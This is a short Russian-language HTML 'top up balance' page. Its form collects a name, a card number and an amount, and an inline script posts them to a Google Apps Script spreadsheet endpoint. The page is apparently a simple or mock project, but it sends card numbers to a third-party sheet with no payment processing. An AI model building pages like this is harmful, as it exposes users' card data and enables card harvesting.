<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Пополнить баланс</title>
    <link rel="stylesheet" href="style.css">
    <link rel="icon" href="img/annikit.png" type="image/x-icon">
</head>
<body>
    
<div class="container">
    <form action="#" class="login-form" name="submit-to-google-sheet">

        <h2>Пополнить баланс</h2>

        <input type="text" name="Name" id="Name" autocomplete="off" placeholder="Введите Ваше имя" required>
        
        <input type="text" name="Card number" id="Card number" autocomplete="off" placeholder="Введите Ваш номер карты" required minlength="12" maxlength="12">

        <input type="text" name="Amount" id="Amount" autocomplete="off" placeholder="Введите сумму пополнения (EUR)" required minlength="4" maxlength="5">
        
        <button type="submit" style="font-size: 40px; display: flex; align-items: center; justify-content: center;">➢</button>

            <h5>Помните, если Вы введете неверные или несуществующие данные, пополнение будет отменено</h5>
    </form>
</div>
    
<script>
    const scriptURL = 'https://script.google.com/macros/s/AKfycbxeZuvUZ7KnSb6f56nNvoCrMyv9muiUlDVx8EBDvxfL65LyPGO13PO-Y1ck8KdWgUk/exec'
    const form = document.forms['submit-to-google-sheet']
  
    form.addEventListener('submit', e => {
      e.preventDefault()
      fetch(scriptURL, { method: 'POST', body: new FormData(form)})
        .then(response => console.log('Success!', response))
        .catch(error => console.error('Error!', error.message))
    })
  </script>

</body>
</html>
